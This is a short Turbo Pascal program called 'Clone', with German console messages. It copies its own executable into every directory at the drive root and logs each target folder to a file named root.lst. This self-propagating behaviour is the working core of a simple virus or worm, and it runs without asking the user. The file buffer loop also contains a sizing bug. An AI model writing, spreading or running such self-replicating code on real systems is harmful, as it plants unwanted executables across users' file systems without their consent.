PROGRAM Clone;

USES Crt,Dos;

CONST
  RetryTime=10;
  FileBufferSize=32768;

VAR
  a,b          : Byte;
  r,q,FileName : string;

  Path     : PathStr;
  Dir      : DirStr;
  Name     : NameStr;
  Ext      : ExtStr;
  FullName : PathStr;
  F        : SearchRec;
  Ch       : Char;
  I        : Integer;

  listfile : Text;

function CopyFile(InputFileName,OutputFileName:string):boolean;
var
  InputFile,OutputFile:file;
  ReadStatus,WriteStatus:word;
  FileBuffer:pointer;
  FileDateTime:longint;

begin
  CopyFile:=False;

  Assign(InputFile,InputFileName);
  Reset(InputFile,1);
  Assign(OutputFile,OutputFileName);
  Rewrite(OutputFile,1);

  if IOResult<>0 then
    Exit;
  if MaxAvail<FileBufferSize then
    Exit;

  GetMem(FileBuffer,FileBufferSize);

  repeat
    BlockRead(InputFile,FileBuffer^,SizeOf(FileBuffer),ReadStatus);
    BlockWrite(OutputFile,FileBuffer^,ReadStatus,WriteStatus);
  until (ReadStatus=0) or (WriteStatus<>ReadStatus);

  FreeMem(FileBuffer,FileBufferSize);

  GetFTime(InputFile,FileDateTime);
  SetFTime(OutputFile,FileDateTime);

  Close(InputFile);
  Close(OutputFile);

  CopyFile:=True;
end;

PROCEDURE GetFileName;
BEGIN
  q := '';
  r := ParamStr(0);
  a := 0;
  b := Length(ParamStr(0));
  REPEAT
    Inc(a);
    q := q+r[b];
    Dec(b);
  UNTIL r[b] = '\';
  b := Length(q);
  r := q;
  FOR i := 1 TO b DO BEGIN
    q[(b+1)-i] := r[i];
  END;
  FileName := q;
END;

Procedure Process(dir : DirStr; s : SearchRec);
begin
  Writeln(dir, s.name);
  Assign(listfile,'root.lst');
  Append(listfile);
  WriteLn(listfile,dir,s.name);
  getfilename;

  r := dir+s.name+'\'+Filename;

  CopyFile(Paramstr(0),r);
  Close(listfile);
end;

Procedure SearchDir(Path : PathStr; fspec : String);
Var
  f : SearchRec;
begin
  Findfirst(Path+fspec, Directory, f);
  While DosError = 0 do
  begin
    IF (f.Attr AND Directory = Directory) THEN BEGIN
      Process(path, f);
      {WriteLn(listfile,path+f.name);
      CopyFile(paramstr(0),path+'clone.exe');}
      WriteLn('datei kopiert!');
    END;
    Findnext(f);
  end;
end;

BEGIN
  ClrScr;
  Assign(listfile,'root.lst');
  Rewrite(listfile);
  Close(listfile);
  SearchDir('\','*.*');
  writeLn(paramstr(0));
  ReadKey;
END.
